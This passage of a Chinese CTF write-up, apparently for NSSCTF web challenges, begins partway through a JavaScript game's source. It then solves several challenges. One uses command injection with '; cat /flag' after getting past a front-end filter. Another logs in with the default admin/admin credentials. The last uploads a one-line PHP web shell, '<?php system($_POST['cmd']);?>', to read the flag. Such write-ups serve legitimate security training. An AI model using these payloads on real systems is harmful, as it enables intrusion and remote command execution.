class=\"keyword\">var</span> position = <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">getPosition</span>();</span><br><span class=\"line\">            <span class=\"keyword\">var</span> offset = <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">getOffset</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">updateDOM</span>(-position.<span class=\"property\">x</span>, -position.<span class=\"property\">y</span>, offset);</span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">tunnelWall</span>.<span class=\"title function_\">updateDOM</span>(-position.<span class=\"property\">x</span>, -position.<span class=\"property\">y</span>, offset);</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"attr\">onMouseMove</span>: <span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> windowWidth = <span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> windowHeight = <span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">setTarget</span>(x - <span class=\"number\">0.5</span>*windowWidth, -(y - <span class=\"number\">0.5</span>*windowHeight));</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"attr\">onMouseClick</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable constant_\">MG</span>.<span class=\"property\">banner</span>.<span class=\"title function_\">isFullyVisible</span>()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">switch</span> (mState) &#123;</span><br><span class=\"line\">                  <span class=\"keyword\">case</span> <span class=\"title class_\">GameState</span>.<span class=\"property\">WAIT_START</span>:</span><br><span class=\"line\">                    <span class=\"title function_\">goRun</span>();</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                  <span class=\"keyword\">case</span> <span class=\"title class_\">GameState</span>.<span class=\"property\">FINISHED</span>:</span><br><span class=\"line\">                    <span class=\"comment\">/* The player is given an infinite number of lives</span></span><br><span class=\"line\"><span class=\"comment\">                    during the qualifying level but these should be</span></span><br><span class=\"line\"><span class=\"comment\">                    removed before continuing. */</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (mLevel === <span class=\"number\">0</span>) &#123;mLives = <span class=\"variable constant_\">STARTING_LIVES</span>;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    mLevel++;</span><br><span class=\"line\"></span><br><span class=\"line\">                    mBestProgress = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"title function_\">goWaitStartLevel</span>();</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                  <span class=\"keyword\">case</span> <span class=\"title class_\">GameState</span>.<span class=\"property\">CRASHED</span>:</span><br><span class=\"line\">                    <span class=\"variable constant_\">MG</span>.<span class=\"property\">banner</span>.<span class=\"title function_\">hide</span>();</span><br><span class=\"line\">                    <span class=\"variable constant_\">MG</span>.<span class=\"property\">fog</span>.<span class=\"title function_\">fadeIn</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (mLives === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                                mLevel = <span class=\"number\">0</span>;</span><br><span class=\"line\">                                mLives = <span class=\"variable constant_\">STARTING_LIVES</span>;</span><br><span class=\"line\">                                mBestProgress = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                mLives--;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">reset</span>();</span><br><span class=\"line\">                            <span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">reset</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"variable constant_\">MG</span>.<span class=\"property\">fog</span>.<span class=\"title function_\">fadeOut</span>();</span><br><span class=\"line\">                            <span class=\"title function_\">goWaitStartLevel</span>();</span><br><span class=\"line\">                        &#125;);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Returns an integer representing the current level */</span></span><br><span class=\"line\">        <span class=\"attr\">getLevel</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> mLevel;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Returns a human readable string describing the current level */</span></span><br><span class=\"line\">        <span class=\"attr\">getLevelString</span>: getLevelString,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Returns the number of times the player can crash before game over. */</span></span><br><span class=\"line\">        <span class=\"comment\">/* If the player crashes with zero lives remaining the game ends */</span></span><br><span class=\"line\">        <span class=\"attr\">getNumLives</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> mLives;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Returns the progress through the level as a value between 0 and 1,</span></span><br><span class=\"line\"><span class=\"comment\">        where 0 is not yet started and 1 is completed. */</span></span><br><span class=\"line\">        <span class=\"attr\">getProgress</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> mProgress;       </span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"attr\">getBestProgress</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> mBestProgress;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;());</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t然后发现重要代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">text</span>:  <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;<span class=\"keyword\">if</span> (mLevel === <span class=\"number\">6</span>) &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;GOT F|L|A|G &#123;y0u_w1n_th1s_!!!&#125;&#x27;</span>;&#125; <span class=\"keyword\">else</span> &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;CLICK TO CONTINUE&#x27;</span>;&#125;&#125;,</span><br></pre></td></tr></table></figure>\n<p>​\t成功获得 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;y0u_w1n_th1s_!!!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-follow-me-and-hack-me\"><a class=\"markdownIt-Anchor\" href=\"#4-follow-me-and-hack-me\">#</a> 4、Follow me and hack me</h2>\n<p>​\t直接 hackbar 传参 GET：?CTF=Lit2023       POST：Challenge=i’m_c0m1ng</p>\n<h2 id=\"5-ping\"><a class=\"markdownIt-Anchor\" href=\"#5-ping\">#</a> 5、Ping：</h2>\n<p>​\t尝试 ping 一下 127.0.0.1 能通，之后尝试；ls 发现不行，被限制了，不过，查看网页源代码发现是前端过滤，禁用 js 之后就能过了，无脑；cat /flag 拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=NSSCTF&#123;1a6530af-202d-463c-b4ea-c0447db5b801&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-1zjs\"><a class=\"markdownIt-Anchor\" href=\"#6-1zjs\">#</a> 6、1zjs：</h2>\n<p>​\t这个 1z 真的 1 点也不 Ez  (&gt;_&lt;)</p>\n<p>​\t第一件事儿查看源码，发现文件./dist/index.umd.js</p>\n<p>​\t在这个文件的注释中找到了一个文件：f@k3f1ag.php</p>\n<p>​\t之后访问这个文件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(+[![]]+[])[+[]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]())[!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[+[]]+[]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[+[]]+[]+[!+[]+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+[]]+[]+[+!+[]]+[]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])</span><br></pre></td></tr></table></figure>\n<p>​\t把这个编码过后的东西扔到控制台中，拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;0f7f6477-a502-49b1-b7fe-01b2439ab608&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"7-作业管理系统\"><a class=\"markdownIt-Anchor\" href=\"#7-作业管理系统\">#</a> 7、作业管理系统</h2>\n<p>​\t先看源码，源码最后注释里说了默认的账号和密码都是 admin，直接登陆：</p>\n<p>​\t之后我不复现了，学校校园网卡我 PHP 马。</p>\n<p>​\t大致说下后续咋做：直接上传 php 文件，内容是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t上传成功后直接读取该文件，然后 post 传入一个 cat /flag 即可。</p>\n<h2 